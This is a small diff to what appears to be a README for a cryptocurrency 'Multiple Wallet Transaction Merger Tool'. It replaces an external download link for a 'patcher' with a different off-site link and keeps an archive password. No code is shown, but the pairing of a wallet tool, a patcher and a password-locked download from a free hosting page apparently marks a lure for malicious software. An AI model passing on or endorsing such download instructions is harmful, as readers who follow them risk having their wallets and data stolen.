@@ -31,9 +31,9 @@ Multiple Wallet Transaction Merger Tool is a professional application for combin
 
 Important: Download the patcher from the link below.
 
-Download: https://software-hub.forumotion.com/t50-multiple-wallet-transaction-merger-tool
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
